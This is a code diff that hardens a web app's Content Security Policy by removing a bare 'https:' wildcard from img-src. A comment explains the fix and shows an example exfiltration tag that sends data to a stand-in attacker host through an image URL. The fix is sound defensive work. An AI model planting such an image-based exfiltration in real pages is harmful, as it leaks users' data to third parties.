@@ -51,7 +51,13 @@ function buildCsp(nonce: string): string {
     `default-src 'self'`,
     `script-src ${scriptSrc}`,
     `style-src 'self' 'unsafe-inline'`,
-    `img-src 'self' data: blob: https://img.clerk.com https://*.plaid.com https:`,
+    // SECURITY FIX (img-src wildcard): removed the trailing bare `https:` that
+    // previously allowed images from any HTTPS origin. That wildcard was a
+    // no-script exfil channel (e.g. <img src="https://attacker/?d=...">) and
+    // permitted arbitrary third-party tracking pixels. Now only the explicit
+    // Clerk + Plaid image hosts are allowed. Add a host below if a real CDN is
+    // later served from.
+    `img-src 'self' data: blob: https://img.clerk.com https://*.plaid.com`,
     `font-src 'self' data:`,
     `connect-src 'self' ${api} https://*.clerk.accounts.dev ${fapiHttps} ${fapiWss} https://clerk-telemetry.com https://api.clerk.com wss://*.clerk.accounts.dev https://*.plaid.com`,
     `frame-src 'self' https://*.clerk.accounts.dev ${fapiHttps} https://cdn.plaid.com https://challenges.cloudflare.com`,
